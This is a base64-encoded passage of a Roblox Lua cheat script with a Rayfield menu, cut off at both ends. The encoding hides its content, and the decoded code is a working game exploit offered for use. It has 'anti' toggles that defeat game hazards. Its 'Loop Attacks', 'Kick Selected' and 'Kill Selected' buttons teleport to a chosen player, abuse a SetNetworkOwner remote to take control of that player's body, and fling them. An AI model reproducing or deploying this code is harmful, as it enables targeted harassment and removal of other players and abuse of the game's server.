ud2FpdCgpIGRvCiAgICAgICAgaWYgTG9jYWxQbGF5ZXI6RmluZEZpcnN0Q2hpbGQoIklzSGVsZCIpIGFuZCBMb2NhbFBsYXllci5Jc0hlbGQuVmFsdWUgPT0gdHJ1ZSB0aGVuCiAgICAgICAgICAgIGxvY2FsIGNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgbG9jYWwgcm9vdCA9IGNoYXIgYW5kIGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICBpZiByb290IHRoZW4KICAgICAgICAgICAgICAgIHJvb3QuQW5jaG9yZWQgPSB0cnVlCiAgICAgICAgICAgICAgICB3aGlsZSBMb2NhbFBsYXllci5Jc0hlbGQuVmFsdWUgPT0gdHJ1ZSBhbmQgYW50aUdyYWJFbmFibGVkIGRvCiAgICAgICAgICAgICAgICAgICAgQ2hhcmFjdGVyRXZlbnRzLlN0cnVnZ2xlOkZpcmVTZXJ2ZXIoTG9jYWxQbGF5ZXIpCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDAxKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICByb290LkFuY2hvcmVkID0gZmFsc2UKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpJbnZpbmNpYmlsaXR5VGFiOkNyZWF0ZVRvZ2dsZSh7CiAgICBOYW1lID0gIkFudGkgR3JhYiIsCiAgICBDdXJyZW50VmFsdWUgPSBmYWxzZSwKICAgIEZsYWcgPSAiQW50aUdyYWIiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihWYWx1ZSkKICAgICAgICBhbnRpR3JhYkVuYWJsZWQgPSBWYWx1ZQogICAgICAgIGlmIFZhbHVlIHRoZW4KICAgICAgICAgICAgdGFzay5zcGF3bihhbnRpR3JhYikKICAgICAgICBlbmQKICAgIGVuZAp9KQoKbG9jYWwgYW50aUV4cGxvZGVFbmFibGVkID0gZmFsc2UKbG9jYWwgZnVuY3Rpb24gYW50aUV4cGxvZGUoKQogICAgV29ya3NwYWNlLkNoaWxkQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihjaGlsZCkKICAgICAgICBpZiBjaGlsZDpJc0EoIlBhcnQiKSBhbmQgY2hpbGQuTmFtZSA9PSAiUGFydCIgYW5kIGFudGlFeHBsb2RlRW5hYmxlZCBhbmQgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgbG9jYWwgcm9vdCA9IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgIGxvY2FsIHJpZ2h0QXJtID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJSaWdodCBBcm0iKQogICAgICAgICAgICBpZiByb290IGFuZCByaWdodEFybSBhbmQgKGNoaWxkLlBvc2l0aW9uIC0gcm9vdC5Qb3NpdGlvbikuTWFnbml0dWRlIDw9IDIwIHRoZW4KICAgICAgICAgICAgICAgIHJvb3QuQW5jaG9yZWQgPSB0cnVlCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wMSkKICAgICAgICAgICAgICAgIHdoaWxlIHJpZ2h0QXJtOkZpbmRGaXJzdENoaWxkKCJSYWdkb2xsTGltYlBhcnQiKSBhbmQgcmlnaHRBcm0uUmFnZG9sbExpbWJQYXJ0LkNhbkNvbGxpZGUgPT0gdHJ1ZSBkbwogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjAwMSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgcm9vdC5BbmNob3JlZCA9IGZhbHNlCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kKQplbmQKCkludmluY2liaWxpdHlUYWI6Q3JlYXRlVG9nZ2xlKHsKICAgIE5hbWUgPSAiQW50aSBFeHBsb2RlIiwKICAgIEN1cnJlbnRWYWx1ZSA9IGZhbHNlLAogICAgRmxhZyA9ICJBbnRpRXhwbG9kZSIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQogICAgICAgIGFudGlFeHBsb2RlRW5hYmxlZCA9IFZhbHVlCiAgICAgICAgaWYgVmFsdWUgdGhlbgogICAgICAgICAgICB0YXNrLnNwYXduKGFudGlFeHBsb2RlKQogICAgICAgIGVuZAogICAgZW5kCn0pCgpsb2NhbCBhbnRpRmlyZUVuYWJsZWQgPSBmYWxzZQpsb2NhbCBhbnRpRmlyZSA9IHsKICAgIHAgPSBQbGF5ZXJzLkxvY2FsUGxheWVyLAogICAgcnMgPSBSdW5TZXJ2aWNlLAogICAgdyA9IFdvcmtzcGFjZSwKICAgIG1vbiA9IGZhbHNlLAogICAgY29uID0gbmlsCn0KCkludmluY2liaWxpdHlUYWI6Q3JlYXRlVG9nZ2xlKHsKICAgIE5hbWUgPSAiQW50aSBGaXJlIiwKICAgIEN1cnJlbnRWYWx1ZSA9IGZhbHNlLAogICAgRmxhZyA9ICJBbnRpRmlyZSIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQogICAgICAgIGFudGlGaXJlLm1vbiA9IFZhbHVlCiAgICAgICAgYW50aUZpcmVFbmFibGVkID0gVmFsdWUKICAgICAgICAKICAgICAgICBpZiBWYWx1ZSB0aGVuCiAgICAgICAgICAgIGFudGlGaXJlLmVwID0gYW50aUZpcmUudy5NYXAuSG9sZS5Qb2lzb25CaWdIb2xlLkV4dGluZ3Vpc2hQYXJ0CiAgICAgICAgICAgIGFudGlGaXJlLm9wID0gYW50aUZpcmUuZXAuUG9zaXRpb24KICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIGZ1bmN0aW9uIGNoZWNrKCkKICAgICAgICAgICAgICAgIGxvY2FsIGhycCA9IChhbnRpRmlyZS5wLkNoYXJhY3RlciBvciBhbnRpRmlyZS5wLkNoYXJhY3RlckFkZGVkOldhaXQoKSk6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgIGxvY2FsIGZpcmVMaWdodCA9IGhycDpGaW5kRmlyc3RDaGlsZCgiRmlyZUxpZ2h0IikKICAgICAgICAgICAgICAgIGxvY2FsIGZpcmVQYXJ0aWNsZSA9IGhycDpGaW5kRmlyc3RDaGlsZCgiRmlyZVBhcnRpY2xlRW1pdHRlciIpCiAgICAgICAgICAgICAgICBpZiBmaXJlTGlnaHQgb3IgZmlyZVBhcnRpY2xlIHRoZW4KICAgICAgICAgICAgICAgICAgICBhbnRpRmlyZS5lcC5DRnJhbWUgPSBDRnJhbWUubmV3KGhycC5Qb3NpdGlvbikKICAgICAgICAgICAgICAgICAgICB3aGlsZSBmaXJlTGlnaHQgb3IgZmlyZVBhcnRpY2xlIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgICAgICAgICAgICAgIGZpcmVMaWdodCA9IGhycDpGaW5kRmlyc3RDaGlsZCgiRmlyZUxpZ2h0IikKICAgICAgICAgICAgICAgICAgICAgICAgZmlyZVBhcnRpY2xlID0gaHJwOkZpbmRGaXJzdENoaWxkKCJGaXJlUGFydGljbGVFbWl0dGVyIikKICAgICAgICAgICAgICAgICAgICAgICAgYW50aUZpcmUuZXAuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhocnAuUG9zaXRpb24pCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgYW50aUZpcmUuZXAuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhhbnRpRmlyZS5vcCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIG5vdCBhbnRpRmlyZS5jb24gdGhlbgogICAgICAgICAgICAgICAgYW50aUZpcmUuY29uID0gYW50aUZpcmUucnMuSGVhcnRiZWF0OkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIGlmIGFudGlGaXJlLm1vbiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGNoZWNrKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICBlbmQKICAgICAgICBlbHNlCiAgICAgICAgICAgIGlmIGFudGlGaXJlLmVwIHRoZW4KICAgICAgICAgICAgICAgIGFudGlGaXJlLmVwLkNGcmFtZSA9IENGcmFtZS5uZXcoYW50aUZpcmUub3ApCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBpZiBhbnRpRmlyZS5jb24gdGhlbgogICAgICAgICAgICAgICAgYW50aUZpcmUuY29uOkRpc2Nvbm5lY3QoKQogICAgICAgICAgICAgICAgYW50aUZpcmUuY29uID0gbmlsCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCn0pCgpsb2NhbCBhbnRpTGFnRW5hYmxlZCA9IGZhbHNlCmxvY2FsIGZ1bmN0aW9uIGFudGlMYWdGKCkKICAgIGxvY2FsIGNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgIGlmIGNoYXIgdGhlbgogICAgICAgIGxvY2FsIHBsYXllclNjcmlwdHMgPSBMb2NhbFBsYXllcjpGaW5kRmlyc3RDaGlsZCgiUGxheWVyU2NyaXB0cyIpCiAgICAgICAgaWYgcGxheWVyU2NyaXB0cyB0aGVuCiAgICAgICAgICAgIGxvY2FsIHNjcmlwdCA9IHBsYXllclNjcmlwdHM6RmluZEZpcnN0Q2hpbGQoIkNoYXJhY3RlckFuZEJlYW1Nb3ZlIikKICAgICAgICAgICAgaWYgc2NyaXB0IHRoZW4KICAgICAgICAgICAgICAgIHNjcmlwdC5EaXNhYmxlZCA9IGFudGlMYWdFbmFibGVkCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCmVuZAoKSW52aW5jaWJpbGl0eVRhYjpDcmVhdGVUb2dnbGUoewogICAgTmFtZSA9ICJBbnRpIExhZyIsCiAgICBDdXJyZW50VmFsdWUgPSBmYWxzZSwKICAgIEZsYWcgPSAiQW50aUxhZyIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQogICAgICAgIGFudGlMYWdFbmFibGVkID0gVmFsdWUKICAgICAgICBhbnRpTGFnRigpCiAgICBlbmQKfSkKCmxvY2FsIGFudGlCbG9ibWFuRW5hYmxlZCA9IGZhbHNlCmxvY2FsIGZ1bmN0aW9uIHJlbW92ZURldGVjdG9ycygpCiAgICBsb2NhbCBjaGFyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICBpZiBjaGFyIHRoZW4KICAgICAgICBsb2NhbCByb290ID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgaWYgcm9vdCB0aGVuCiAgICAgICAgICAgIGZvciBfLCBvYmogaW4gcGFpcnMoV29ya3NwYWNlOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICBpZiBvYmo6SXNBKCJCYXNlUGFydCIpIGFuZCAob2JqLk5hbWUgPT0gIkxlZnREZXRlY3RvciIgb3Igb2JqLk5hbWUgPT0gIlJpZ2h0RGV0ZWN0b3IiKSBhbmQgKHJvb3QuUG9zaXRpb24gLSBvYmouUG9zaXRpb24pLk1hZ25pdHVkZSA+IDEwIHRoZW4KICAgICAgICAgICAgICAgICAgICBvYmo6RGVzdHJveSgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBhcHBseUFudGlNYXNzbGVzcygpCiAgICB3aGlsZSBhbnRpQmxvYm1hbkVuYWJsZWQgZG8KICAgICAgICBpZiBMb2NhbFBsYXllci5DaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICBmb3IgXywgcGFydCBpbiBpcGFpcnMoTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICBpZiBwYXJ0OklzQSgiQmFzZVBhcnQiKSBhbmQgcGFydC5NYXNzbGVzcyB0aGVuCiAgICAgICAgICAgICAgICAgICAgcGFydC5NYXNzbGVzcyA9IGZhbHNlCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgdGFzay53YWl0KDEpCiAgICBlbmQKZW5kCgpJbnZpbmNpYmlsaXR5VGFiOkNyZWF0ZVRvZ2dsZSh7CiAgICBOYW1lID0gIkFudGkgQmxvYm1hbiIsCiAgICBDdXJyZW50VmFsdWUgPSBmYWxzZSwKICAgIEZsYWcgPSAiQW50aUJsb2JtYW4iLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihWYWx1ZSkKICAgICAgICBhbnRpQmxvYm1hbkVuYWJsZWQgPSBWYWx1ZQogICAgICAgIGlmIFZhbHVlIHRoZW4KICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSBhbnRpQmxvYm1hbkVuYWJsZWQgZG8KICAgICAgICAgICAgICAgICAgICByZW1vdmVEZXRlY3RvcnMoKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgdGFzay5zcGF3bihhcHBseUFudGlNYXNzbGVzcykKICAgICAgICBlbmQKICAgIGVuZAp9KQoKbG9jYWwgTG9vcFNlY3Rpb24gPSBBdHRhY2tUYWI6Q3JlYXRlU2VjdGlvbigiTG9vcCBBdHRhY2tzIikKCmxvY2FsIGZ1bmN0aW9uIHVwZGF0ZURyb3Bkb3ducygpCiAgICBsb2NhbCBwbGF5ZXJzID0gZ2V0QWxsUGxheWVycygpCiAgICBTZWxlY3REcm9wZG93bjpSZWZyZXNoKHBsYXllcnMsIHRydWUpCiAgICAKICAgIGxvY2FsIGxvb3BQbGF5ZXJzID0ge30KICAgIGZvciBuYW1lLCBfIGluIHBhaXJzKGF0dGFja1RhcmdldHMpIGRvCiAgICAgICAgdGFibGUuaW5zZXJ0KGxvb3BQbGF5ZXJzLCBuYW1lKQogICAgZW5kCiAgICBMb29wRHJvcGRvd246UmVmcmVzaChsb29wUGxheWVycywgdHJ1ZSkKZW5kCgpsb2NhbCBTZWxlY3REcm9wZG93biA9IEF0dGFja1RhYjpDcmVhdGVEcm9wZG93bih7CiAgICBOYW1lID0gIlBpY2sgVGFyZ2V0IiwKICAgIE9wdGlvbnMgPSBnZXRBbGxQbGF5ZXJzKCksCiAgICBDdXJyZW50T3B0aW9uID0gIiIsCiAgICBNdWx0aXBsZU9wdGlvbnMgPSBmYWxzZSwKICAgIEZsYWcgPSAiU2VsZWN0UGxheWVyIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oVmFsdWUpCiAgICAgICAgc2VsZWN0ZWRUYXJnZXQgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKFZhbHVlKQogICAgZW5kCn0pCgpsb2NhbCBMb29wRHJvcGRvd24gPSBBdHRhY2tUYWI6Q3JlYXRlRHJvcGRvd24oewogICAgTmFtZSA9ICJMb29wIFRhcmdldCBMaXN0IiwKICAgIE9wdGlvbnMgPSB7fSwKICAgIEN1cnJlbnRPcHRpb24gPSAiIiwKICAgIE11bHRpcGxlT3B0aW9ucyA9IGZhbHNlLAogICAgRmxhZyA9ICJMb29wUGxheWVycyIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQogICAgICAgIHNlbGVjdGVkVGFyZ2V0ID0gUGxheWVyczpGaW5kRmlyc3RDaGlsZChWYWx1ZSkKICAgIGVuZAp9KQoKdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICB3aGlsZSB0YXNrLndhaXQoMTUpIGRvCiAgICAgICAgdXBkYXRlRHJvcGRvd25zKCkKICAgIGVuZAplbmQpCgpBdHRhY2tUYWI6Q3JlYXRlQnV0dG9uKHsKICAgIE5hbWUgPSAiQWRkIHRvIExpc3QiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgaWYgc2VsZWN0ZWRUYXJnZXQgYW5kIG5vdCBhdHRhY2tUYXJnZXRzW3NlbGVjdGVkVGFyZ2V0Lk5hbWVdIHRoZW4KICAgICAgICAgICAgYXR0YWNrVGFyZ2V0c1tzZWxlY3RlZFRhcmdldC5OYW1lXSA9IHRydWUKICAgICAgICAgICAgdXBkYXRlRHJvcGRvd25zKCkKICAgICAgICAgICAgUmF5ZmllbGQ6Tm90aWZ5KHsKICAgICAgICAgICAgICAgIFRpdGxlID0gIkFkZGVkIiwKICAgICAgICAgICAgICAgIENvbnRlbnQgPSBzZWxlY3RlZFRhcmdldC5OYW1lIC4uICIgYWRkZWQgdG8gbGlzdCIsCiAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDIsCiAgICAgICAgICAgICAgICBJbWFnZSA9IDQ0ODMzNjI0NTgsCiAgICAgICAgICAgIH0pCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCkF0dGFja1RhYjpDcmVhdGVCdXR0b24oewogICAgTmFtZSA9ICJSZW1vdmUgZnJvbSBMaXN0IiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGlmIHNlbGVjdGVkVGFyZ2V0IGFuZCBhdHRhY2tUYXJnZXRzW3NlbGVjdGVkVGFyZ2V0Lk5hbWVdIHRoZW4KICAgICAgICAgICAgYXR0YWNrVGFyZ2V0c1tzZWxlY3RlZFRhcmdldC5OYW1lXSA9IG5pbAogICAgICAgICAgICBzZWxlY3RlZFRhcmdldCA9IG5pbAogICAgICAgICAgICB1cGRhdGVEcm9wZG93bnMoKQogICAgICAgICAgICBSYXlmaWVsZDpOb3RpZnkoewogICAgICAgICAgICAgICAgVGl0bGUgPSAiUmVtb3ZlZCIsCiAgICAgICAgICAgICAgICBDb250ZW50ID0gIlBsYXllciByZW1vdmVkIiwKICAgICAgICAgICAgICAgIER1cmF0aW9uID0gMiwKICAgICAgICAgICAgICAgIEltYWdlID0gNDQ4MzM2MjQ1OCwKICAgICAgICAgICAgfSkKICAgICAgICBlbmQKICAgIGVuZAp9KQoKQXR0YWNrVGFiOkNyZWF0ZUJ1dHRvbih7CiAgICBOYW1lID0gIktpY2sgU2VsZWN0ZWQgKE9uZSBUaW1lKSIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBpZiBub3Qgc2VsZWN0ZWRUYXJnZXQgdGhlbgogICAgICAgICAgICBSYXlmaWVsZDpOb3RpZnkoewogICAgICAgICAgICAgICAgVGl0bGUgPSAiRXJyb3IiLAogICAgICAgICAgICAgICAgQ29udGVudCA9ICJQaWNrIGEgdGFyZ2V0IGZpcnN0IiwKICAgICAgICAgICAgICAgIER1cmF0aW9uID0gMywKICAgICAgICAgICAgICAgIEltYWdlID0gNDQ4MzM2MjQ1OCwKICAgICAgICAgICAgfSkKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgaWYgaXNJblBsb3Qoc2VsZWN0ZWRUYXJnZXQpIHRoZW4KICAgICAgICAgICAgUmF5ZmllbGQ6Tm90aWZ5KHsKICAgICAgICAgICAgICAgIFRpdGxlID0gIkVycm9yIiwKICAgICAgICAgICAgICAgIENvbnRlbnQgPSAiUGxheWVyIGluIHBsb3QiLAogICAgICAgICAgICAgICAgRHVyYXRpb24gPSAzLAogICAgICAgICAgICAgICAgSW1hZ2UgPSA0NDgzMzYyNDU4LAogICAgICAgICAgICB9KQogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBsb2NhbCB0YXJnZXRDaGFyID0gc2VsZWN0ZWRUYXJnZXQuQ2hhcmFjdGVyCiAgICAgICAgaWYgbm90IHRhcmdldENoYXIgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgCiAgICAgICAgbG9jYWwgdGFyZ2V0Um9vdCA9IHRhcmdldENoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgIGxvY2FsIHRhcmdldEh1bWFub2lkID0gdGFyZ2V0Q2hhcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgICAgICBsb2NhbCB0YXJnZXRIZWFkID0gdGFyZ2V0Q2hhcjpGaW5kRmlyc3RDaGlsZCgiSGVhZCIpCiAgICAgICAgCiAgICAgICAgaWYgbm90IHRhcmdldFJvb3Qgb3Igbm90IHRhcmdldEh1bWFub2lkIG9yIG5vdCB0YXJnZXRIZWFkIHRoZW4gcmV0dXJuIGVuZAogICAgICAgIGlmIHRhcmdldEh1bWFub2lkLkhlYWx0aCA8PSAwIHRoZW4gcmV0dXJuIGVuZAogICAgICAgIAogICAgICAgIGxvY2FsIG15Q2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGxvY2FsIG15Um9vdCA9IG15Q2hhciBhbmQgbXlDaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAKICAgICAgICBpZiBub3QgbXlSb290IHRoZW4gcmV0dXJuIGVuZAogICAgICAgIAogICAgICAgIGxvY2FsIG9yaWdpbmFsUG9zaXRpb24gPSBteVJvb3QuQ0ZyYW1lCiAgICAgICAgCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIG15Q2hhcjpQaXZvdFRvKHRhcmdldFJvb3QuQ0ZyYW1lICogQ0ZyYW1lLm5ldyg1LCAtMTguNSwgMCkpCiAgICAgICAgICAgICAgICBub2NvbGwodGFyZ2V0Q2hhcikKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbG9jYWwgYXR0ZW1wdHMgPSAwCiAgICAgICAgICAgICAgICBsb2NhbCBnb3RPd25lcnNoaXAgPSBmYWxzZQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICByZXBlYXQKICAgICAgICAgICAgICAgICAgICBTZXROZXR3b3JrT3duZXI6RmlyZVNlcnZlcih0YXJnZXRSb290LCBteVJvb3QuQ0ZyYW1lKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjE1KQogICAgICAgICAgICAgICAgICAgIGF0dGVtcHRzID0gYXR0ZW1wdHMgKyAxCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYgdGFyZ2V0SGVhZDpGaW5kRmlyc3RDaGlsZCgiUGFydE93bmVyIikgYW5kIHRhcmdldEhlYWQuUGFydE93bmVyLlZhbHVlID09IExvY2FsUGxheWVyLk5hbWUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBnb3RPd25lcnNoaXAgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICB1bnRpbCBhdHRlbXB0cyA+IDE1CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIG15Um9vdC5DRnJhbWUgPSBvcmlnaW5hbFBvc2l0aW9uCiAgICAgICAgICAgICAgICBteVJvb3QuQXNzZW1ibHlMaW5lYXJWZWxvY2l0eSA9IFZlY3RvcjMuemVybwogICAgICAgICAgICAgICAgbXlSb290LkFzc2VtYmx5QW5ndWxhclZlbG9jaXR5ID0gVmVjdG9yMy56ZXJvCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIGdvdE93bmVyc2hpcCB0aGVuCiAgICAgICAgICAgICAgICAgICAgZmxpbmcodGFyZ2V0Um9vdCwgdGFyZ2V0SHVtYW5vaWQpCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgICAgICAgICBEZXN0cm95R3JhYkxpbmU6RmlyZVNlcnZlcih0YXJnZXRSb290KQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIFJheWZpZWxkOk5vdGlmeSh7CiAgICAgICAgICAgICAgICAgICAgICAgIFRpdGxlID0gIlN1Y2Nlc3MiLAogICAgICAgICAgICAgICAgICAgICAgICBDb250ZW50ID0gIktpY2tlZCAiIC4uIHNlbGVjdGVkVGFyZ2V0Lk5hbWUsCiAgICAgICAgICAgICAgICAgICAgICAgIER1cmF0aW9uID0gMiwKICAgICAgICAgICAgICAgICAgICAgICAgSW1hZ2UgPSA0NDgzMzYyNDU4LAogICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgbXlSb290IHRoZW4KICAgICAgICAgICAgICAgIG15Um9vdC5DRnJhbWUgPSBvcmlnaW5hbFBvc2l0aW9uCiAgICAgICAgICAgICAgICBteVJvb3QuQXNzZW1ibHlMaW5lYXJWZWxvY2l0eSA9IFZlY3RvcjMuemVybwogICAgICAgICAgICAgICAgbXlSb290LkFzc2VtYmx5QW5ndWxhclZlbG9jaXR5ID0gVmVjdG9yMy56ZXJvCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAp9KQoKQXR0YWNrVGFiOkNyZWF0ZUJ1dHRvbih7CiAgICBOYW1lID0gIktpbGwgU2VsZWN0ZWQgKE9uZSBUaW1lKSIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBpZiBub3Qgc2VsZWN0ZWRUYXJnZXQgdGhlbgogICAgICAgICAgICBSYXlmaWVsZDpOb3RpZnkoewogICAgICAgICAgICAgICAgVGl0bGUgPSAiRXJyb3IiLAogICAgICAgICAgICAgICAgQ29udGVudCA9ICJQaWNrIGEgdGFyZ2V0IGZpcnN0IiwKICAgICAgICAgICAgICAgIER1cmF0aW9uID0gMywKICAgICAgICAgICAgICAgIEltYWdlID0gNDQ4MzM2MjQ1OCwKICAgICAgICAgICAgfSkKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgaWYgaXNJblBsb3Qoc2VsZWN0ZWRUYXJnZXQpIHRoZW4KICAgICAgICAgICAgUmF5ZmllbGQ6Tm90aWZ5KHsKICAgICAgICAgICAgICAgIFRpdGxlID0gIkVycm9yIiwKICAgICAgICAgICAgICAgIENvbnRlbnQgPSAiUGxheWVyIGluIHBsb3QiLAogICAgICAgICAgICAgICAgRHVyYXRpb24gPSAzLAogICAgICAgICAgICAgICAgSW1hZ2UgPSA0NDgzMzYyNDU4LAogICAgICAgICAgICB9KQogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBsb2NhbCB0YXJnZXRDaGFyID0gc2VsZWN0ZWRUYXJnZXQuQ2hhcmFjdGVyCiAgICAgICAgaWYgbm90IHRhcmdldENoYXIgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgCiAgICAgICAgbG9jYWwgdGFyZ2V0Um9vdCA9IHRhcmdldENoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgIGxvY2FsIHRhcmdldEh1bWFub2lkID0gdGFyZ2V0Q2hhcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgICAgICBsb2NhbCB0YXJnZXRIZWFkID0gdGFyZ2V0Q2hhcjpGaW5kRmlyc3RDaGlsZCgiSGVhZCIpCiAgICAgICAgCiAgICAgICAgaWYgbm90IHRhcmdldFJvb3Qgb3Igbm90IHRhcmdldEh1bWFub2lkIG9yIG5vdCB0YXJnZXRIZWFkIHRoZW4gcmV0dXJuIGVuZAogICAgICAgIGlmIHRhcmdldEh1bWFub2lkLkhlYWx0aCA8PSAwIHRoZW4gcmV0dXJuIGVuZAogICAgICAgIAogICAgICAgIGxvY2FsIG15Q2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGxvY2FsIG15Um9vdCA9IG15Q2hhciBhbmQgbXlDaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAKICAgICAgICBpZiBub3QgbXlSb290IHRoZW4gcmV0dXJuIGVuZAogICAgICAgIAogICAgICAgIGxvY2FsIG9yaWdpbmFsUG9zaXRpb24gPSBteVJvb3QuQ0ZyYW1lCiAgICAgICAgCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIG15Q2hhcjpQaXZvdFRvKHRhcmdldFJvb3QuQ0ZyYW1lICogQ0ZyYW1lLm5ldygwLCAtNiwgMCkpCiAgICAgICAgICAgICAgICBub2NvbGwodGFyZ2V0Q2hhcikKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbG9jYWwgYXR0ZW1wdHMgPSAwCiAgICAgICAgICAgICAgICBsb2NhbCBnb3RPd25lcnNoaXAgPSBmYWxzZQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICByZXBlYXQKICAgICAgICAgICAgICAgICAgICBTZXROZXR3b3JrT3duZXI6RmlyZVNlcnZlcih0YXJnZXRSb290LCBteVJvb3QuQ0ZyYW1lKQogICAgICAg